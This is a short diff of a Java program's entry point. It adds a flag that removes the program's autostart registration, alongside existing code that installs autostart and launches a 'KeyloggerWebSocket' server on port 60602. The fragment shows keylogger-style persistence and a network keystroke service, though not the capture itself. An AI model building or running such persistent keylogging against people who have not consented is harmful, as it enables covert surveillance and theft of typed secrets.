@@ -45,7 +45,8 @@ public class Main {
             port=60602;
         }
         boolean autostartRequired= !args.containsKey("disable_autostart");
-        if(autostartRequired) {
+        boolean autostartRemove=args.containsKey("remove_autostart");
+        if(autostartRequired && !autostartRemove) {
             boolean autostartInstalled=Autostart.isAutostartRegistered();
             if(!autostartInstalled) {
                 setLoggerSettings(Autostart.getLogger());
@@ -56,6 +57,9 @@ public class Main {
             }
         }else{
             logger.info("autostart disabled");
+        }
+        if(autostartRemove) {
+            Autostart.removeAutostart();
         }
         KeyloggerWebSocket ws=new KeyloggerWebSocket(port);
         ws.start();
